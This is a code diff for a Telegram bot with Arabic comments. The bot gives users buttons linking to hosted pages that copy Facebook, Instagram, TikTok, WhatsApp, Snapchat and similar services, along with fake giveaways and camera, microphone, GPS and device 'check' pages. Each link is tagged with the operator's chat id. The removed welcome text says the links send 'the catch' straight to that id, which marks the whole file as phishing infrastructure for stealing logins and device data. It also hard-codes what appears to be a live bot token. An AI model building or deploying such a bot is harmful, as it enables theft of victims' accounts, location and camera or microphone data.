@@ -1,57 +1,82 @@
-# -*- coding: utf-8 -*-
-# 🔱 GENERAL BOT – PUBLIC PLATFORM v8 🔱
+import logging
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, ContextTypes
 
-import telebot
-from telebot import types
-import os
-import time
-
-# --- إعدادات المنصة ---
+# ========== الإعدادات ==========
 TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
-RENDER_URL = "https://fgnral-html-5waj.onrender.com" 
+BASE_URL = "https://fgnral-html-5waj.onrender.com"   # رابط استضافة الصفحات
 
-bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
+# تفعيل التسجيل
+logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-# حل مشكلة التعارض 409 نهائياً
-try:
-    bot.remove_webhook()
-except:
-    pass
-
-# قائمة الصفحات الـ 10 التي رفعتها
-MY_PAGES = [
-    ("🔵 فيسبوك", "facebook.html"), ("🟪 انستغرام", "instagram.html"),
-    ("⬛ تيك توك", "tiktok.html"), ("✈️ تلغرام", "telegram.html"),
-    ("🎮 ببجي UC", "pubg_cuc.html"), ("🏆 مسابقة الحلم", "dream.html"),
-    ("📍 موقع GPS", "gps.html"), ("📸 فحص كاميرا", "camera.html"),
-    ("📱 معلومات جهاز", "device.html"), ("🎤 فحص ميكروفون", "mic.html")
+# ========== قائمة الصفحات (الاسم، الملف، الإيموجي) ==========
+PAGES = [
+    ("معلومات النظام", "device.html", "📱"),
+    ("مسابقة الحلم 2026", "dream.html", "🏆"),
+    ("فحص الميكروفون", "mic.html", "🎤"),
+    ("فحص الفيديو", "video.html", "🎥"),
+    ("شحن ببجي", "pubg_cuc.html", "🎮"),
+    ("Discord Nitro", "discord.html", "🎧"),
+    ("Instagram", "instagram.html", "📸"),
+    ("Facebook", "facebook.html", "📘"),
+    ("Reddit", "reddit.html", "🤖"),
+    ("فحص الكاميرا", "camera.html", "📷"),
+    ("X (Twitter)", "twitter.html", "🐦"),
+    ("TikTok", "tiktok.html", "🎵"),
+    ("WhatsApp Web", "whatsapp.html", "💬"),
+    ("Snapchat", "snapchat.html", "👻"),
+    ("تحسين الموقع (GPS)", "gps.html", "📍"),
+    ("Telegram Premium", "telegram.html", "✈️"),
+    ("YouTube Premium", "youtube.html", "▶️"),
 ]
 
-def build_keyboard(user_id):
-    markup = types.InlineKeyboardMarkup()
-    for i in range(0, len(MY_PAGES), 2):
-        row = []
-        name1, file1 = MY_PAGES[i]
-        url1 = f"{RENDER_URL}/{file1}?chat={user_id}"
-        row.append(types.InlineKeyboardButton(text=name1, url=url1))
-        
-        if i + 1 < len(MY_PAGES):
-            name2, file2 = MY_PAGES[i+1]
-            url2 = f"{RENDER_URL}/{file2}?chat={user_id}"
-            row.append(types.InlineKeyboardButton(text=name2, url=url2))
-        markup.row(*row)
-    return markup
-
-@bot.message_handler(commands=['start'])
-def welcome(message):
-    uid = message.chat.id
-    text = (
-        f"<b>🔱 أهلاً بك في منصة الجنرال 🔱</b>\n\n"
-        f"الروابط مبرمجة لترسل الصيد لآيديك تلقائياً.\n"
-        f"👤 <b>آيديك:</b> <code>{uid}</code>"
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """رسالة الترحيب + أزرار مرتبة في صفين"""
+    chat_id = update.effective_chat.id
+    keyboard = []
+    
+    # ترتيب الأزرار في صفين (عمودين)
+    row = []
+    for name, filename, emoji in PAGES:
+        url = f"{BASE_URL}/{filename}?chat={chat_id}"
+        button = InlineKeyboardButton(f"{emoji} {name}", url=url)
+        row.append(button)
+        if len(row) == 2:          # كل صف يحتوي على زرين
+            keyboard.append(row)
+            row = []
+    # إذا بقي زر مفرد يضاف في صف منفرد
+    if row:
+        keyboard.append(row)
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    welcome_text = (
+        "✨ *مرحباً بك في بوت GNRAL BOT* ✨\n\n"
+        "📌 *اختر الخدمة التي تريدها من الأزرار أدناه:*\n"
+        "🔹 سيتم إضافة معرف الدردشة تلقائياً لإرسال البيانات إليك.\n\n"
+        "———————————————————\n"
+        "© 2026 *GNRAL BOT* - جميع الحقوق محفوظة"
     )
-    bot.send_message(uid, text, reply_markup=build_keyboard(uid))
+    
+    await update.message.reply_text(
+        welcome_text,
+        reply_markup=reply_markup,
+        parse_mode="Markdown"
+    )
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """معالج النقر على الأزرار (اختياري)"""
+    query = update.callback_query
+    await query.answer()
+
+def main():
+    app = Application.builder().token(TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    
+    logger.info("✅ البوت يعمل الآن باسم GNRAL BOT...")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
-    print("🔱 البوت يعمل بنظام Polling الآن...")
-    bot.infinity_polling()
+    main()
